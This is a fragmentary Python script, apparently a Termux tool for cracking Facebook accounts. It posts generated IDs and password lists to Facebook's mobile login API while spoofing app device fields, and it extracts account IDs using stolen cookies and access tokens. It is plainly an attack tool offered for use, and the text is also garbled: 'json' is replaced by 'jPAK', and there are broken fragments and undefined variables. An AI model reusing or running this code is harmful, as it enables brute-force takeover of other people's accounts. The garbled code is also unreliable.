...
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,jPAK,io,struct
        from string import *
...
try:
        import os,sys,time,jPAK,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
...
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'jPAK', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get("https://github.com/mohsin09114/Trick/blob/main/File.txt").text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923465228754?text={bumper}")
                        qsbuy()
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=jPAK&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).jPAK()
                                #print(po,hdata)ata)
                                try:
                                        roid = str(po['uid'])
                                except:
...
def new_file(cookies,access_token):
        ...
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                PAK = f"qaiser{str(random.randint(0,90))}.txt"
        except:
                PAK = f"qaiser{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+PAK+'')
        print(' Total ids Extracted : '+str(len(total)))
        print(' New ids Saved As : /sdcard/'+PAK)
